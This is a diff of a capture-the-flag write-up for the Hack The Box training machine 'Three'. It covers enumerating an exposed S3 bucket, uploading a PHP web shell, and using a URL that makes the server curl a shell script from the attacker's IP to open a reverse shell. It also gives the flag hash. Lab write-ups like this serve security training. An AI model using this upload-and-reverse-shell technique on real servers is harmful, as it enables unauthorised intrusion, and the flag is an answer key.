@@ -1,8 +1,14 @@
-# Three
+### Three
 
-Three is a very easy linux machine on Hack The Box Starting Point Tier 1 that focuses on compromising and php webserver hosted by an AWS S3 bucket by creating a reverse shell.
+**OS:** Linux<br>
+**Difficulty:** Very Easy<br>
+**Collection:** [Starting Point Tier 1](/StartingPoint/Tier1/)<br>
+**Tags:** Cloud, Custom Applications, AWS, Reconnaissance, Web Site Structure Discovery, Bucket Enumeration, Arbitrary File Upload, Anonymous/Guest Access<br>
 
-## Task 1
+
+---
+
+#### Task 1
 
 **How many TCP ports are open?**
 
@@ -11,7 +17,11 @@ Three is a very easy linux machine on Hack The Box Starting Point Tier 1 that fo
 We use the `nmap` command with the `-sT` flag to scan TCP ports.
 ![Nmap TCP Scan](open_ports.png)
 
-## Task 2
+
+
+---
+
+#### Task 2
 
 **What is the domain of the email address provided in the "Contact" section of the website?**
 
@@ -21,7 +31,11 @@ We navigate to the contact page on the website:
 
 ![Contact Email Domain](contact.png)
 
-## Task 3
+
+
+---
+
+#### Task 3
 
 **In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?**
 
@@ -29,7 +43,11 @@ We navigate to the contact page on the website:
 
 ![Adding Host](adding_host.png)
 
-## Task 4
+
+
+---
+
+#### Task 4
 
 **Which sub-domain is discovered during further enumeration?**
 
@@ -39,25 +57,41 @@ First we use `wget` to download a [dns subdomain wordlist](https://raw.githubuse
 
 ![Subdomain](subdomain.png)
 
-## Task 5
+
+
+---
+
+#### Task 5
 
 **Which service is running on the discovered sub-domain?**
 
 > Amazon s3
 
-## Task 6
+
+
+---
+
+#### Task 6
 
 **Which command line utility can be used to interact with the service running on the discovered sub-domain?**
 
 > awscli
 
-## Task 7
+
+
+---
+
+#### Task 7
 
 **Which command is used to set up the AWS CLI installation?**
 
 > aws configure
 
-## Task 8
+
+
+---
+
+#### Task 8
 
 **What is the command used by the above utility to list all of the S3 buckets?**
 
@@ -67,7 +101,11 @@ After using the `aws configure` command, we use the `aws s3 ls` command with the
 
 ![List S3 Buckets](s3_buckets.png)
 
-## Task 9
+
+
+---
+
+#### Task 9
 
 **This server is configured to run files written in what web scripting language?**
 
@@ -77,7 +115,11 @@ We use the `aws s3 ls` command again to view all the files in the s3 bucket. It 
 
 ![php Website](language.png)
 
-## Flag
+
+
+---
+
+#### Flag
 
 > a980d99281a28d638ac68b9bf9453c2b
 
@@ -110,3 +152,5 @@ Lastly we visit `http://thetoppers.htb/shell.php?cmd=curl%20{Our IP}:8080/shell.
 Using our reverse shell, we search for the `flag.txt` file and then display its contents:
 
 ![Final Reverse Shell](reverse_shell2.png)
+
+---
